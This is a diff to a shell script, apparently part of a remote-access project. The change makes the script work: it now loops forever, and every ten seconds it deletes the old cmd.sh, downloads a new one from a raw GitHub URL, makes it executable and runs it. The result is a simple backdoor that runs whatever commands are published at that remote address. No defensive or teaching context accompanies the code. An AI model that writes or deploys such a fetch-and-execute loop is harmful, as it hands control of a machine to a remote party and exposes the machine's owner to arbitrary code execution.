@@ -6,13 +6,19 @@
 # every INTERVAL.
 
 INTERVAL=10
-GIT_PATH="https://raw.github.com/mets634/neleus/"
+CMD_URL="https://raw.githubusercontent.com/mets634/neleus/master/remote_access/cmd.sh"
 
 while true; do # endless loop
+    echo "[$0]Sleeping $INTERVAL..."
     sleep $INTERVAL # sleep
-    
+
+    echo "[$0]Removing old file..."
     rm cmd.sh # remove old cmd file
-    
-    wget "" # get new cmd file
-    ./cmd.sh # run cmd file
+
+    echo "[$0]Getting new cmd..."
+    wget $CMD_URL # get new file
+
+    echo "[$0]Running cmd..."
+    chmod +x cmd.sh # grant execution privileges
+    ./cmd.sh # run cmd 
 done
